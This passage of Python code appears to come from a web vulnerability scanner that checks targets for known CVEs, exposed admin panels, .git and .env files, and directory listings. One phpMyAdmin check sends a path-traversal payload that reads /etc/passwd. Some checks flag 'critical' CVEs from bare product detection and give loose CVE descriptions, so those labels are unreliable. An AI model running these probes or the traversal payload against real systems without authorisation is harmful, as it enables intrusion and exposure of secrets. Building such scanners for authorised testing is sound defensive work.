        return vulnerabilities

    def _check_cve_2019_2729(self, base_url: str) -> List[Dict]:
        """CVE-2019-2729: Oracle WebLogic RCE via IIOP."""
        vulnerabilities = []
        path = "/ws_utc/config.do"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code in (200, 302, 401):
                if 'weblogic' in resp.text.lower() or 'ws_utc' in resp.text.lower():
                    vulnerabilities.append({
                        'type': 'CVE-2019-2729 - WebLogic IIOP RCE',
                        'severity': 'critical',
                        'url': url,
                        'evidence': 'WebLogic ws_utc endpoint accessible - IIOP deserialization vector',
                        'cve_references': ['CVE-2019-2729'],
                        'description': 'Oracle WebLogic Server IIOP deserialization RCE',
                        'remediation': 'Apply Oracle Critical Patch Update July 2019',
                    })
        except Exception as e:
            logger.debug(f"CVE-2019-2729 error: {e}")

        # Also check for other WebLogic endpoints
        wl_paths = ['/_async/AsyncResponseService', '/uddiexplorer/', '/bea_wls_deployment_internal']
        for wp in wl_paths:
            try:
                test_url = urljoin(base_url, wp)
                resp = self.http_client.get(test_url, timeout=self.timeout)
                if resp and resp.status_code in (200, 302):
                    if 'weblogic' in resp.text.lower() or 'async' in resp.text.lower():
                        vulnerabilities.append({
                            'type': 'Oracle WebLogic Endpoint Exposed',
                            'severity': 'high',
                            'url': test_url,
                            'evidence': f'WebLogic endpoint accessible: {wp}',
                            'description': 'Oracle WebLogic internal endpoint exposed - potential RCE vector',
                            'remediation': 'Restrict access to WebLogic internal endpoints',
                        })
                        break
            except Exception:
                pass
        return vulnerabilities

    # =========================================================================
    # phpMyAdmin CVEs
    # =========================================================================

    def _check_cve_2018_12613(self, base_url: str) -> List[Dict]:
        """CVE-2018-12613: phpMyAdmin file inclusion."""
        vulnerabilities = []
        path = "/phpmyadmin/index.php?target=db_sql.php%253f/../../../../etc/passwd"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code == 200:
                if 'root:x:0:0' in resp.text or 'phpmyadmin' in resp.text.lower():
                    vulnerabilities.append({
                        'type': 'CVE-2018-12613 - phpMyAdmin File Inclusion',
                        'severity': 'critical',
                        'url': url,
                        'evidence': 'phpMyAdmin file inclusion via target parameter',
                        'cve_references': ['CVE-2018-12613'],
                        'description': 'phpMyAdmin file inclusion RCE via target parameter',
                        'remediation': 'Upgrade phpMyAdmin to 4.8.2+',
                    })
        except Exception as e:
            logger.debug(f"CVE-2018-12613 error: {e}")
        return vulnerabilities

    def _check_cve_2018_19968(self, base_url: str) -> List[Dict]:
        """CVE-2018-19968: phpMyAdmin RCE via transformation."""
        vulnerabilities = []
        path = "/phpmyadmin/index.php"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code == 200 and 'phpmyadmin' in resp.text.lower():
                vulnerabilities.append({
                    'type': 'CVE-2018-19968 - phpMyAdmin RCE',
                    'severity': 'critical',
                    'url': url,
                    'evidence': 'phpMyAdmin interface detected - RCE via transformation wrapper',
                    'cve_references': ['CVE-2018-19968'],
                    'description': 'phpMyAdmin RCE via crafted transformation wrapper',
                    'remediation': 'Upgrade phpMyAdmin to 4.8.4+',
                })
        except Exception as e:
            logger.debug(f"CVE-2018-19968 error: {e}")
        return vulnerabilities

    def _check_cve_2017_11582(self, base_url: str) -> List[Dict]:
        """CVE-2017-11582: phpMyAdmin RCE via SQL injection."""
        vulnerabilities = []
        path = "/phpmyadmin/phpmyadmin/index.php"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code in (200, 302, 401):
                if 'phpmyadmin' in resp.text.lower():
                    vulnerabilities.append({
                        'type': 'CVE-2017-11582 - phpMyAdmin SQLi RCE',
                        'severity': 'critical',
                        'url': url,
                        'evidence': 'phpMyAdmin interface detected',
                        'cve_references': ['CVE-2017-11582'],
                        'description': 'phpMyAdmin SQL injection by remote authenticated users',
                        'remediation': 'Upgrade phpMyAdmin to 4.7.3+',
                    })
        except Exception as e:
            logger.debug(f"CVE-2017-11582 error: {e}")
        return vulnerabilities

    def _check_phpmyadmin_accessible(self, base_url: str) -> List[Dict]:
        """phpMyAdmin interface accessible without restriction."""
        vulnerabilities = []
        phpmyadmin_paths = [
            '/phpmyadmin/', '/pma/', '/admin/phpmyadmin/',
            '/myadmin/', '/phpMyAdmin/', '/mysql/', '/sql/',
            '/phpmyadmin/index.php', '/phpMyAdmin/index.php',
        ]
        found = False
        for p in phpmyadmin_paths:
            if found:
                break
            try:
                url = urljoin(base_url, p)
                resp = self.http_client.get(url, timeout=self.timeout)
                if resp and resp.status_code == 200:
                    body_lower = resp.text.lower()
                    if 'phpmyadmin' in body_lower or 'pmadb' in body_lower or 'pma_' in body_lower:
                        vulnerabilities.append({
                            'type': 'phpMyAdmin Interface Exposed',
                            'severity': 'high',
                            'url': url,
                            'evidence': f'phpMyAdmin interface accessible at {p}',
                            'description': 'phpMyAdmin database management interface exposed to unauthenticated users',
                            'remediation': 'Restrict phpMyAdmin access to trusted IPs, enable authentication, or remove from production',
                        })
                        found = True
                        break
            except Exception as e:
                logger.debug(f"phpMyAdmin detect error: {e}")
        return vulnerabilities

    # =========================================================================
    # General Web Security Checks
    # =========================================================================

    def _check_cve_2019_6340(self, base_url: str) -> List[Dict]:
        """CVE-2019-6340: Drupal XSS via REST API."""
        vulnerabilities = []
        paths = [
            '/rest/views/block_content/block_content',
            '/rest/views/block/block',
            '/node/1?_format=hal_json',
        ]
        for p in paths:
            try:
                url = urljoin(base_url, p)
                headers = {
                    'Content-Type': 'application/hal+json',
                    'Accept': 'application/hal+json',
                }
                resp = self.http_client.get(url, headers=headers, timeout=self.timeout)
                if resp and resp.status_code in (200, 401, 403):
                    body_lower = resp.text.lower()
                    if 'drupal' in body_lower or 'rest' in body_lower:
                        vulnerabilities.append({
                            'type': 'CVE-2019-6340 - Drupal REST XSS',
                            'severity': 'high',
                            'url': url,
                            'evidence': 'Drupal REST endpoint accessible - XSS via hal_json',
                            'cve_references': ['CVE-2019-6340'],
                            'description': 'Drupal XSS via REST API with HAL JSON format',
                            'remediation': 'Upgrade Drupal to 8.6.10+ or 8.5.11+',
                        })
                        break
            except Exception as e:
                logger.debug(f"CVE-2019-6340 error: {e}")
        return vulnerabilities

    def _check_cve_2020_15070(self, base_url: str) -> List[Dict]:
        """CVE-2020-15070: Zimbra info disclosure."""
        vulnerabilities = []
        path = "/zimbraAdmin/"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code in (200, 302, 401):
                if 'zimbra' in resp.text.lower() or 'zm' in resp.text.lower():
                    vulnerabilities.append({
                        'type': 'CVE-2020-15070 - Zimbra Admin Exposure',
                        'severity': 'high',
                        'url': url,
                        'evidence': 'Zimbra admin interface detected',
                        'cve_references': ['CVE-2020-15070'],
                        'description': 'Zimbra Collaboration admin interface exposed',
                        'remediation': 'Restrict Zimbra admin interface access',
                    })
        except Exception as e:
            logger.debug(f"CVE-2020-15070 error: {e}")

        # Check for Zimbra webmail
        path2 = "/zimbra/"
        url2 = urljoin(base_url, path2)
        try:
            resp = self.http_client.get(url2, timeout=self.timeout)
            if resp and resp.status_code in (200, 302, 401):
                if 'zimbra' in resp.text.lower():
                    vulnerabilities.append({
                        'type': 'Zimbra WebMail Exposed',
                        'severity': 'medium',
                        'url': url2,
                        'evidence': 'Zimbra webmail interface accessible',
                        'description': 'Zimbra webmail client exposed - check for recent Zimbra CVEs',
                        'remediation': 'Keep Zimbra updated with latest security patches',
                    })
        except Exception:
            pass
        return vulnerabilities

    def _check_grafana_access(self, base_url: str) -> List[Dict]:
        """Grafana dashboard accessible without authentication."""
        vulnerabilities = []
        paths = [
            '/grafana/', '/grafana/login', '/grafana/dashboards',
            '/d/', '/dashboards', '/explore',
        ]
        for p in paths:
            try:
                url = urljoin(base_url, p)
                resp = self.http_client.get(url, timeout=self.timeout)
                if resp and resp.status_code == 200:
                    body_lower = resp.text.lower()
                    if 'grafana' in body_lower or 'graph' in body_lower or 'dashboard' in body_lower:
                        vulnerabilities.append({
                            'type': 'Grafana Dashboard Accessible',
                            'severity': 'high',
                            'url': url,
                            'evidence': f'Grafana interface accessible at {p}',
                            'description': 'Grafana dashboard accessible - may leak metrics, dashboards, and data source info',
                            'remediation': 'Enable Grafana authentication, restrict access to trusted networks',
                        })
                        break
            except Exception as e:
                logger.debug(f"Grafana error: {e}")
        return vulnerabilities

    def _check_kibana_access(self, base_url: str) -> List[Dict]:
        """Kibana dashboard accessible without authentication."""
        vulnerabilities = []
        paths = [
            '/kibana/', '/kibana/app/kibana', '/kibana/login',
            '/elastic/', '/elasticsearch/',
        ]
        for p in paths:
            try:
                url = urljoin(base_url, p)
                resp = self.http_client.get(url, timeout=self.timeout)
                if resp and resp.status_code == 200:
                    body_lower = resp.text.lower()
                    if 'kibana' in body_lower or 'elastic' in body_lower:
                        vulnerabilities.append({
                            'type': 'Kibana Dashboard Accessible',
                            'severity': 'high',
                            'url': url,
                            'evidence': f'Kibana interface accessible at {p}',
                            'description': 'Kibana dashboard accessible - may expose Elasticsearch data',
                            'remediation': 'Enable Kibana authentication, restrict access to trusted networks',
                        })
                        break
            except Exception as e:
                logger.debug(f"Kibana error: {e}")
        return vulnerabilities

    def _check_git_exposed(self, base_url: str) -> List[Dict]:
        """Git repository exposed via .git directory."""
        vulnerabilities = []
        path = "/.git/config"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code == 200:
                if '[core]' in resp.text and 'repositoryformatversion' in resp.text:
                    vulnerabilities.append({
                        'type': 'Git Repository Exposed',
                        'severity': 'critical',
                        'url': url,
                        'evidence': '.git/config accessible - full repository may be downloadable',
                        'description': 'Git repository exposed via .git directory - leads to source code and credential disclosure',
                        'remediation': 'Remove .git directory from production, add deny rules in web server config',
                    })
        except Exception as e:
            logger.debug(f"Git exposed error: {e}")

        # Also check for other VCS
        vcs_paths = [
            '/.svn/entries', '/.svn/', '/.hg/',
            '/CVS/Root', '/.DS_Store', '/.bzr/',
        ]
        for vp in vcs_paths:
            try:
                url = urljoin(base_url, vp)
                resp = self.http_client.get(url, timeout=self.timeout)
                if resp and resp.status_code == 200 and len(resp.text) > 10:
                    vulnerabilities.append({
                        'type': 'Version Control System Exposure',
                        'severity': 'high',
                        'url': url,
                        'evidence': f'VCS directory/file exposed: {vp}',
                        'description': f'Version control system file exposed via {vp}',
                        'remediation': 'Remove VCS metadata from production environments',
                    })
                    break
            except Exception:
                pass
        return vulnerabilities

    def _check_dotenv_exposed(self, base_url: str) -> List[Dict]:
        """Environment file exposure."""
        vulnerabilities = []
        env_paths = [
            '/.env', '/.env.local', '/.env.production', '/.env.development',
            '/.env.staging', '/.env.example', '/env', '/environment',
            '/.env.save', '/.env.bak', '/.env.old',
            '/backend/.env', '/api/.env', '/app/.env',
        ]
        for ep in env_paths:
            try:
                url = urljoin(base_url, ep)
                resp = self.http_client.get(url, timeout=self.timeout)
                if resp and resp.status_code == 200 and len(resp.text) > 20:
                    body = resp.text
                    if ('APP_ENV' in body or 'APP_KEY' in body or 'DB_HOST' in body or
                        'DB_PASSWORD' in body or 'DB_USERNAME' in body or 'SECRET' in body or
                        'API_KEY' in body or 'AWS_' in body or 'S3_' in body):
                        vulnerabilities.append({
                            'type': 'Environment File Exposure',
                            'severity': 'critical',
                            'url': url,
                            'evidence': f'Environment file exposed at {ep} with credentials',
                            'description': 'Environment (.env) file exposed - reveals database credentials, API keys, and secrets',
                            'remediation': 'Block .env files via web server config, never store .env in web root',
                        })
                        break
            except Exception as e:
                logger.debug(f".env exposed error: {e}")
        return vulnerabilities

    def _check_directory_listing(self, base_url: str) -> List[Dict]:
        """Directory listing enabled on sensitive paths."""
        vulnerabilities = []
        dir_paths = [
            '/uploads/', '/backup/', '/backups/', '/admin/', '/logs/',
            '/wp-content/uploads/', '/files/', '/images/', '/css/',
            '/js/', '/static/', '/assets/', '/downloads/', '/tmp/',
        ]
        dir_indicators = [
            'Index of /', '<title>Index of', '<h1>Directory listing',
            'Directory Listing', '[parent directory]', 'Parent Directory',
            '..\\n',
        ]
        for dp in dir_paths:
            try:
                url = urljoin(base_url, dp)
                resp = self.http_client.get(url, timeout=self.timeout)
                if resp and resp.status_code == 200:
                    for indicator in dir_indicators:
                        if indicator in resp.text:
                            vulnerabilities.append({
                                'type': 'Directory Listing Enabled',
                                'severity': 'medium',
                                'url': url,
                                'evidence': f'Directory listing enabled on {dp}',
                                'description': f'Directory listing enabled on {dp} - exposes file structure and potential sensitive files',
                                'remediation': 'Disable directory listing in web server configuration',
                            })
                            break
                    break
            except Exception as e:
                logger.debug(f"Directory listing error: {e}")
        return vulnerabilities

    def _check_admin_panels(self, base_url: str) -> List[Dict]:
        """Common admin/login panels exposed."""
        vulnerabilities = []
        admin_paths = [
            '/admin/', '/administrator/', '/admin/login/', '/admin/login.php',
            '/login/', '/login.php', '/user/login', '/wp-admin/',
            '/wp-login.php', '/panel/', '/cpanel/', '/dashboard/',
            '/manager/', '/management/', '/admin/panel/', '/backend/',
            '/admin/panel.php', '/cp/', '/controlpanel/',
            '/phpinfo.php', '/info.php', '/test.php',
            '/server-status', '/server-info',
        ]
        for ap in admin_paths:
            try:
                url = urljoin(base_url, ap)
                resp = self.http_client.get(url, timeout=self.timeout)
                if resp and resp.status_code == 200:
                    body_lower = resp.text.lower()
                    login_keywords = ['password', 'username', 'login', 'sign in', 'admin',
                                      'administration', 'dashboard', 'control panel',
                                      'php info', 'php version', 'server status']
                    matches = [kw for kw in login_keywords if kw in body_lower]
                    if len(matches) >= 2:
                        vulnerabilities.append({
                            'type': 'Admin/Login Panel Exposed',
                            'severity': 'medium',
                            'url': url,
                            'evidence': f'Admin or login panel accessible at {ap}',
                            'description': f'Administrative or login panel exposed at {ap}',
                            'remediation': 'Restrict admin panel access to trusted IPs, use strong authentication',
                        })
                        break
            except Exception as e:
                logger.debug(f"Admin panel error: {e}")
        return vulnerabilities
